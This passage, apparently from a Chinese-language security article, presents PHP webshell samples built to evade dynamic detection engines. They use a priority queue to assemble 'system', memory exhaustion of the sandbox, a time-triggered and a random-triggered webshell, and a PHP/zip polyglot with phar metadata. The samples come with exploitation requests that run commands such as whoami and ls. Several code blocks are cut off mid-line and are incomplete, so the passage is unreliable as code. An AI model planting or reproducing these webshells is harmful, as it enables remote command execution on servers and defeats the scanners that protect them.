} 
$a($b); 
0x0D 优先级队列 
优先级队列与堆排序思想基本类似，不同的是，我这里使用优先级队列对 system 关键
词进行更细颗粒度的拆分。想办法让传参影响 system 每个字符的顺序。 
请看样本： 
insert('m',1); 
$objPQ->insert('s',6); 
$objPQ->insert('e',3); 
$objPQ->insert('s',4); 
$objPQ->insert('y',5); 
$objPQ->insert('t',$_GET[a]); 
$objPQ->setExtractFlags(SplPriorityQueue::EXTR_DATA); 
//Go to TOP 
$objPQ->top(); 
$m=''; 
$cur = new ErrorException($_GET[b]); 
while($objPQ->valid()){ 
    $m.=$objPQ->current(); 
    $objPQ->next(); 
} 
echo $m($cur->getMessage()); 
?> 
假设 GET 参数不存在或为 0，此时得到的函数为：sysemt 并不是危险函数。但是，当
$_GET['a']为 3 时，函数变成了： system ，就成为了危险函数。 
该样本的利用 payload 为：/x.php?a=3&b=whoami 
0x0E 内存不足 
内存不足的思想是：查杀引擎的动态执行需要消耗内存空间，由于同一时间处理的样本
很多，因此单独给每个沙箱环境分配的内存往往不会太多，如果我构造一个样本，能够让查
杀引擎由于内存不足提前终止查杀，而在真实环境中内存可以满足执行需要，就能够执行到
恶意的代码了，恰好 PHP 的内存申请是可以通过 php_ini 在运行时动态修改的。 
请看样本： 
    111111111111111111111111111111111111111111111111 
'; 
$var = str_repeat("php7_do9gy", 100000000); 
echo memory_get_usage(); 
class bb{}?> 
    111111111111111111111111111111111111111111111111 
getMessage()); 
?> 
该样本关键的一段内容在： 
'; 
$var = str_repeat("php7_do9gy", 100000000); 
echo memory_get_usage(); 
这预计会消耗 1G 的内存空间。经过测试，我本地是可以执行成功的。 
0x0F 未来 WebShell 
思路：动态查杀是基于 PHP 文件上传后动态执行的，那么有没有可能上传一个文件，
上传时它还不是 WebShell，它自己过几分钟变成一个 WebShell 呢？这样在上传时就可以躲
过动态查杀。正好，结合 0x05 和 0x06 两种模式，我们尽可能将是否为 WebShell 的判断依
据前置到一个 if 条件中，然后让这个条件以当前时间为依据，那么上传时的 Unix 时间戳小
于某个值，返回结果 True，动态引擎自然判定这是一个正常的文件，而过一段时间，时间变
化了返回结果变为了 False，再去请求这个 WebShell 自然就能够执行了。 
一直想构造这样一个未来的 webshell，但是由于网站对时间相关的函数过滤很严，直到我发
现了 DateTime 类的 getTimestamp 方法。 
仅有这个思路是不够的，在实现时，还结合了反射的技巧以及 PHP 条件优化。 
getParameters() as $param) { 
    $da = new DateTime(); 
    echo $da->getTimestamp(); 
    echo 'Name: ' . $param->getName() . PHP_EOL; 
    $n='F'; 
    if ($param->isOptional()) { 
        if($da->getTimestamp()>=1648470471||$n='1'){ 
            echo $n; 
        } 
        echo 'Default value: ' . 
ltrim($param->getDefaultValueConstantName(),$n)($q->getMessage()); 
    } 
    echo PHP_EOL; 
} 
?> 
构思： 
1. ParseError getmessage 传递 get 参数。 
2. ReflectionFunction 反射 FSYSTEM 函数 
3. ltrim 替换 最左侧的 F，第一个参数是'F' 还是 ’1‘ 直接关系到 进入最后的函数名称 
4. if($da->getTimestamp()>=1648470471||$n='1') 这一行利用 if 判断的优化执行，A || B 
当 A 成立则 B 省略执行。 $da->getTimestamp()>=1648470471 类似于 time()，因为 time
函数被过滤了，只能这样传递。 
1648470471 对应于 2022-03-28 20:27:51  ，此时通过 Webshell 检测，扫描的时候时
间 20：26 没到 20：27，因此它还不是 webshell，但是过一分钟访问变成 webshell 了。属
于一次性执行成功，但是前提是等一下再一次性执行。 
利用方法：/x.php?a=ls 
0x10 量子 WebShell 
不满足于未来 WebShell 的挖掘，我又找到了一种新的模式——量子 WebShell。在 PHP
引擎查杀时，利用随机数，让判断条件在大多数情况下都不成立，此时这个 WebShell 处于
是 WebShell 和非 WebShell 的叠加态，当且仅当参数传递缩小随机数生成范围以后，让条件
恒成立，此时该样本坍缩到一个 WebShell 的状态，可以稳定触发。 
请看代码： 
getParameters() as $param) { 
    $da = new DateTime(); 
    echo $da->getTimestamp(); 
    echo 'Name: ' . $param->getName() . PHP_EOL; 
    $n='F'; 
    if ($param->isOptional()) { 
        if(mt_rand(55,$p->getMessage()??100)==55||$n='1'){ 
            echo $n; 
        } 
        echo 'Default value: ' . 
ltrim($param->getDefaultValueConstantName(),$n)($q->getMessage()); 
    } 
    echo PHP_EOL; 
} 
?> 
关键点在于： 
mt_rand(55,$p->getMessage()??100)==55 
在关键的判断函数中，我运用随机数生成函数 mt_rand （ 因为 rand 被过滤了），而该
随机数生成范围可以通过 HTTP 请求头参数来控制，当我传递 a: 55 时，就锁定了随机数区
间，确保判断条件成立。 
利用方法： 
GET /bbb/2.php?a=whoami HTTP/1.1 
Host: aaa.com:955 
a: 55 
0x11 多类型文件 
这个想法来自于“代码审计”知识星球中朽木自雕转发国外 CTF 的一道题，题目想要构
造一个文件，让这个文件既是 pdf 又是 wav 同时还要是 tar，经过一天的分析我解决了该题，
并且获益良多，于是我想：能否构造一个文件让它既是 PHP 文件又是 zip 文件呢？答案是
肯定的。请看文件： 
php 代码仅仅为一句话，加载自己这个文件 zip 属性的 s.t 文件，那么 s.t 在哪里呢？就
在压缩包内。我将恶意文件 s.t 压缩为 zip 后将其十六进制内容拼接在这一句话代码的前后
两端，注意要复制两份同时拼接在前后两端，否则可能会解压失败。 
经过测试 s.t 也不能是简单的 php 一句话木马，否则会被 HIDS 查杀，因此我对 s.t 也进行了
一定变形 s.t： 
startBuffering(); 
$phar->setStub(""); //设置 stub 
$o = new Test(); 
$phar->setMetadata($o); //将自定义的 meta-data 存入 manifest 
$phar->addFromString("test.txt", "test"); //添加要压缩的文件 
$phar->stopBuffering();    //签名自动计算 
var_dump($phar->getSignature()); 
同样的方法，构造好 Phar 文件以后将其二进制数据拼接到文件末尾，不同之处在于，
由于 Phar 文件有签名校验，拼接之后的文件会无法通过签名校验，因此我们还需要手动计
算和修改一下签名，这里各大家留下一个练习。